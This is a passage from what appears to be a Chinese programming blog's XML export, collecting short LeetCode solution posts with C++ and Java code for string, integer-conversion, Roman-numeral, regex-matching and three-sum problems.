<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; chars;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;j &lt; length ;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars.<span class="built_in">find</span>(s.at(j)) != chars.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                i = <span class="built_in">max</span>(chars.at(s.at(j)), i);</span><br><span class="line">            &#125;</span><br><span class="line">            result = <span class="built_in">max</span>(result, j - i + <span class="number">1</span>);</span><br><span class="line">            chars[s.at(j)] = j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<p>CPP标准库中的map有一个小坑。使用map.insert方法并不能把相同key的值给覆盖掉，必须使用[]运算符才行。至于为什么，去翻翻STL源码就行了，这里就不展开叙述了。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode.com/problems/longest-substring-without-repeating-characters/solution/" target="_blank" rel="noopener">https://leetcode.com/problems/longest-substring-without-repeating-characters/solution/</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>6. Z字形变换</title>
    <url>/2018/09/10/LeetCode/leetcode-000006-Z%E5%AD%97%E5%BD%A2%E5%8F%98%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">convert</span><span class="params">(<span class="built_in">string</span> s, <span class="keyword">int</span> nRows)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> result;</span><br><span class="line">        <span class="keyword">if</span> (nRows &lt; <span class="number">2</span>) <span class="keyword">return</span> s;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; nRows;++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i;j &lt; s.length();j += <span class="number">2</span> * (nRows - <span class="number">1</span>)) &#123;</span><br><span class="line">                result.push_back(s[j]);</span><br><span class="line">                <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; i &lt; nRows - <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (j + <span class="number">2</span> * (nRows - i - <span class="number">1</span>) &lt; s.length())</span><br><span class="line">                        result.push_back(s[j + <span class="number">2</span> * (nRows - i - <span class="number">1</span>)]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>5. 最长回文子串</title>
    <url>/2018/09/10/LeetCode/leetcode-000005-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestPalindrome</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> len = s.size();</span><br><span class="line">        <span class="keyword">if</span>(len &lt;= <span class="number">1</span>)<span class="keyword">return</span> s;</span><br><span class="line">        <span class="built_in">string</span> str = preProcess(s);</span><br><span class="line">        <span class="keyword">int</span> n = str.size(), id = <span class="number">0</span>, mx = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;p(n, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p[i] = mx &gt; i ? min(p[<span class="number">2</span>*id-i], mx-i) : <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(str[i+p[i]] == str[i-p[i]])p[i]++;</span><br><span class="line">            <span class="keyword">if</span>(i + p[i] &gt; mx)</span><br><span class="line">            &#123;</span><br><span class="line">                mx = i + p[i];</span><br><span class="line">                id = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>, index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(p[i] &gt; maxLen)</span><br><span class="line">            &#123;</span><br><span class="line">                maxLen = p[i];</span><br><span class="line">                index = i;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substr((index - maxLen)/<span class="number">2</span>, maxLen<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">preProcess</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="built_in">string</span> res; </span><br><span class="line">        res.push_back(<span class="string">'$'</span>);</span><br><span class="line">        res.push_back(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.push_back(s[i]);</span><br><span class="line">            res.push_back(<span class="string">'#'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push_back(<span class="string">'^'</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>7. 反转整数</title>
    <url>/2018/09/10/LeetCode/leetcode-000007%E5%8F%8D%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>)         <span class="comment">// don't care positive or negetive</span></span><br><span class="line">    &#123;</span><br><span class="line">        res = res * <span class="number">10</span> + x % <span class="number">10</span>;   <span class="comment">// get lowest digit then multi 10</span></span><br><span class="line">        x /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>8. 字符串转整数 (atoi)</title>
    <url>/2018/09/10/LeetCode/leetcode-000008-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%95%B4%E6%95%B0%20(atoi)/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">atoi</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span> </span>&#123;</span><br><span class="line">         <span class="comment">// Start typing your C/C++ solution below</span></span><br><span class="line">         <span class="comment">// DO NOT write int main() function</span></span><br><span class="line">         assert(str != <span class="literal">NULL</span>);</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">while</span>(<span class="built_in">isspace</span>(*str)) str++;  <span class="comment">// remove ' '</span></span><br><span class="line">             </span><br><span class="line">             </span><br><span class="line">         <span class="keyword">int</span> sign = (*str == <span class="string">'-'</span>) ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">if</span> (*str == <span class="string">'-'</span> || *str == <span class="string">'+'</span>)    <span class="comment">// if can check one char</span></span><br><span class="line">             str++;</span><br><span class="line">             </span><br><span class="line">         <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">while</span>(<span class="built_in">isdigit</span>(*str))   <span class="comment">// is digit</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="keyword">int</span> digit = *str - <span class="string">'0'</span>;</span><br><span class="line">             </span><br><span class="line">             <span class="keyword">if</span> (INT_MAX / <span class="number">10</span> &gt;= ret)</span><br><span class="line">                 ret *= <span class="number">10</span>;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">                 <span class="keyword">return</span> sign == <span class="number">-1</span> ? INT_MIN : INT_MAX;</span><br><span class="line">                 </span><br><span class="line">             <span class="keyword">if</span> (INT_MAX - digit &gt;= ret)</span><br><span class="line">                 ret += digit;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">                 <span class="keyword">return</span> sign == <span class="number">-1</span> ? INT_MIN : INT_MAX;</span><br><span class="line">                 </span><br><span class="line">             str++;</span><br><span class="line">         &#125;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">return</span> ret * sign;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>10. 正则表达式匹配</title>
    <url>/2018/09/10/LeetCode/leetcode-000010-%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%8C%B9%E9%85%8D/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isMatch</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">const</span> <span class="keyword">char</span> *p)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">if</span>( <span class="number">0</span> == *p) &#123;</span><br><span class="line">		    <span class="keyword">return</span> <span class="number">0</span> == *s;	</span><br><span class="line">	    &#125; </span><br><span class="line">	    <span class="keyword">if</span>(*(p+<span class="number">1</span>) != <span class="string">'*'</span>) &#123;</span><br><span class="line">		    <span class="keyword">if</span>(*p == *s || (*p) == <span class="string">'.'</span> &amp;&amp; (*s) != <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="keyword">return</span> isMatch(s+<span class="number">1</span>, p+<span class="number">1</span>);</span><br><span class="line">		    &#125;</span><br><span class="line">		    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		    <span class="keyword">while</span>(*p == *s || ((*p) == <span class="string">'.'</span> &amp;&amp; (*s) != <span class="number">0</span>)) &#123;</span><br><span class="line">			    <span class="keyword">if</span>(isMatch(s, p + <span class="number">2</span>)) &#123;</span><br><span class="line">			    	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			    &#125;</span><br><span class="line">			    s++;</span><br><span class="line">		    &#125;</span><br><span class="line">		    <span class="keyword">return</span> isMatch(s, p + <span class="number">2</span>);</span><br><span class="line">	    &#125;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>12. 整数转罗马数字</title>
    <url>/2018/09/10/LeetCode/leetcode-000012.%20%E6%95%B4%E6%95%B0%E8%BD%AC%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">intToRoman</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> str;    </span><br><span class="line">        <span class="built_in">string</span> symbol[]=&#123;<span class="string">"M"</span>,<span class="string">"CM"</span>,<span class="string">"D"</span>,<span class="string">"CD"</span>,<span class="string">"C"</span>,<span class="string">"XC"</span>,<span class="string">"L"</span>,<span class="string">"XL"</span>,<span class="string">"X"</span>,<span class="string">"IX"</span>,<span class="string">"V"</span>,<span class="string">"IV"</span>,<span class="string">"I"</span>&#125;;    </span><br><span class="line">        <span class="keyword">int</span> value[]=    &#123;<span class="number">1000</span>,<span class="number">900</span>,<span class="number">500</span>,<span class="number">400</span>, <span class="number">100</span>, <span class="number">90</span>,  <span class="number">50</span>, <span class="number">40</span>,  <span class="number">10</span>, <span class="number">9</span>,   <span class="number">5</span>,  <span class="number">4</span>,   <span class="number">1</span>&#125;;   </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;num!=<span class="number">0</span>;++i)  </span><br><span class="line">        &#123;  </span><br><span class="line">            <span class="keyword">while</span>(num&gt;=value[i])  </span><br><span class="line">            &#123;  </span><br><span class="line">                num-=value[i];  </span><br><span class="line">                str+=symbol[i];  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">return</span> str;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>13. 罗马数字转整数</title>
    <url>/2018/09/10/LeetCode/leetcode-000013.%20%E7%BD%97%E9%A9%AC%E6%95%B0%E5%AD%97%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>罗马数字包含以下七种字符: I， V， X， L，C，D 和 M。</p>
<p>字符          数值<br>I             1<br>V             5<br>X             10<br>L             50<br>C             100<br>D             500<br>M             1000</p>
<p>例如， 罗马数字 2 写做 II ，即为两个并列的 1。12 写做 XII ，即为 X + II 。 27 写做  XXVII, 即为 XX + V + II 。</p>
<p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 IIII，而是 IV。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 IX。这个特殊的规则只适用于以下六种情况：</p>
<pre><code>I 可以放在 V (5) 和 X (10) 的左边，来表示 4 和 9。
X 可以放在 L (50) 和 C (100) 的左边，来表示 40 和 90。 
C 可以放在 D (500) 和 M (1000) 的左边，来表示 400 和 900。</code></pre><p>给定一个罗马数字，将其转换成整数。输入确保在 1 到 3999 的范围内。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"III"</span></span><br><span class="line">输出: <span class="number">3</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"IV"</span></span><br><span class="line">输出: <span class="number">4</span></span><br></pre></td></tr></table></figure>

<h2 id="示例-3："><a href="#示例-3：" class="headerlink" title="示例 3："></a>示例 3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"IX"</span></span><br><span class="line">输出: <span class="number">9</span></span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"LVIII"</span></span><br><span class="line">输出: <span class="number">58</span></span><br><span class="line">解释: L = <span class="number">50</span>, V= <span class="number">5</span>, III = <span class="number">3</span>.</span><br></pre></td></tr></table></figure>

<h2 id="示例5："><a href="#示例5：" class="headerlink" title="示例5："></a>示例5：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"MCMXCIV"</span></span><br><span class="line">输出: <span class="number">1994</span></span><br><span class="line">解释: M = <span class="number">1000</span>, CM = <span class="number">900</span>, XC = <span class="number">90</span>, IV = <span class="number">4</span>.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">c2n</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>: <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'V'</span>: <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'X'</span>: <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'L'</span>: <span class="keyword">return</span> <span class="number">50</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'C'</span>: <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'D'</span>: <span class="keyword">return</span> <span class="number">500</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'M'</span>: <span class="keyword">return</span> <span class="number">1000</span>;</span><br><span class="line">            <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Start typing your C/C++ solution below</span></span><br><span class="line">        <span class="comment">// DO NOT write int main() function</span></span><br><span class="line">        <span class="keyword">if</span>(s.size() &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">char</span> sb[<span class="number">9</span>] = &#123; <span class="string">'I'</span>,<span class="string">'V'</span>,<span class="string">'X'</span>, <span class="string">'L'</span>,<span class="string">'C'</span>, <span class="string">'D'</span>,<span class="string">'M'</span>, <span class="string">'v'</span>, <span class="string">'x'</span> &#125;;<span class="comment">//v和x应该是大写的上面有一横</span></span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> sub = c2n(s[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">int</span> lastv = sub;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt; s.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">char</span> curc = s[i];</span><br><span class="line">            <span class="keyword">int</span> curv = c2n(curc);</span><br><span class="line">            <span class="keyword">if</span>(curv == lastv) </span><br><span class="line">                sub += curv;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>( curv &lt; lastv) &#123;</span><br><span class="line">                result += sub;</span><br><span class="line">                sub = curv;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sub = curv - sub;</span><br><span class="line">            &#125;</span><br><span class="line">            lastv = curv;</span><br><span class="line">        &#125;</span><br><span class="line">        result += sub;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="解法二："><a href="#解法二：" class="headerlink" title="解法二："></a>解法二：</h3><p>算出罗马数字的所有可能，然后按照先匹配两个，再匹配一个区计算</p>
<h4 id="Java-1"><a href="#Java-1" class="headerlink" title="Java"></a>Java</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap&lt;String,Integer&gt; map ;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">romanToInt</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        initializeMap() ;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span> ;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span> , n = s.length() ;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; n - <span class="number">1</span>)&#123;</span><br><span class="line">            String temp = s.substring(i,i+<span class="number">2</span>) ;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(temp))&#123;</span><br><span class="line">                res += map.get(temp) ;</span><br><span class="line">                i += <span class="number">2</span> ;</span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                temp = temp.substring(<span class="number">0</span>,<span class="number">1</span>) ;</span><br><span class="line">                <span class="keyword">if</span>(map.containsKey(temp))&#123;</span><br><span class="line">                    res += map.get(temp) ;</span><br><span class="line">                &#125;</span><br><span class="line">                i += <span class="number">1</span> ;</span><br><span class="line">                <span class="keyword">continue</span> ;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(i == n-<span class="number">1</span>)&#123;</span><br><span class="line">            res += map.get(s.substring(n-<span class="number">1</span>,n)) ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initializeMap</span><span class="params">()</span></span>&#123;</span><br><span class="line">        map = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        map.put(<span class="string">"M"</span>,<span class="number">1000</span>) ;</span><br><span class="line">        map.put(<span class="string">"CM"</span>,<span class="number">900</span>) ;</span><br><span class="line">        map.put(<span class="string">"D"</span>,<span class="number">500</span>) ;</span><br><span class="line">        map.put(<span class="string">"CD"</span>,<span class="number">400</span>) ;</span><br><span class="line">        map.put(<span class="string">"C"</span>,<span class="number">100</span>) ;</span><br><span class="line">        map.put(<span class="string">"XC"</span>,<span class="number">90</span>) ;</span><br><span class="line">        map.put(<span class="string">"L"</span>,<span class="number">50</span>) ;     </span><br><span class="line">        map.put(<span class="string">"XL"</span>,<span class="number">40</span>) ;</span><br><span class="line">        map.put(<span class="string">"X"</span>,<span class="number">10</span>) ;</span><br><span class="line">        map.put(<span class="string">"IX"</span>,<span class="number">9</span>) ;</span><br><span class="line">        map.put(<span class="string">"V"</span>,<span class="number">5</span>) ;</span><br><span class="line">        map.put(<span class="string">"IV"</span>,<span class="number">4</span>) ;</span><br><span class="line">        map.put(<span class="string">"I"</span>,<span class="number">1</span>) ;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>15. 三数之和</title>
    <url>/2018/09/10/LeetCode/leetcode-000015.%20%E4%B8%89%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h2 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">threeSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = num.size();</span><br><span class="line">        sort(num.begin(), num.end());</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; res;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt; <span class="number">0</span> &amp;&amp; num[i] == num[i<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">int</span> target2 = <span class="number">0</span> - num[i];</span><br><span class="line">                twoSum(num, i+<span class="number">1</span>, target2, res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">twoSum</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;sortedNum, <span class="keyword">int</span> start, <span class="keyword">int</span> target, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt;&amp;res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> head = start, tail = sortedNum.size() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(head &lt; tail) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = sortedNum[head] + sortedNum[tail];</span><br><span class="line">            <span class="keyword">if</span>(tmp &lt; target)</span><br><span class="line">                head++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(tmp &gt; target)</span><br><span class="line">                tail--;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                res.push_back(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&#123;sortedNum[start<span class="number">-1</span>], sortedNum[head], sortedNum[tail]&#125;);</span><br><span class="line">                <span class="keyword">int</span> k = head+<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>(k &lt; tail &amp;&amp; sortedNum[k] == sortedNum[head])k++;</span><br><span class="line">                head = k;</span><br><span class="line">                </span><br><span class="line">                k = tail<span class="number">-1</span>;</span><br><span class="line">                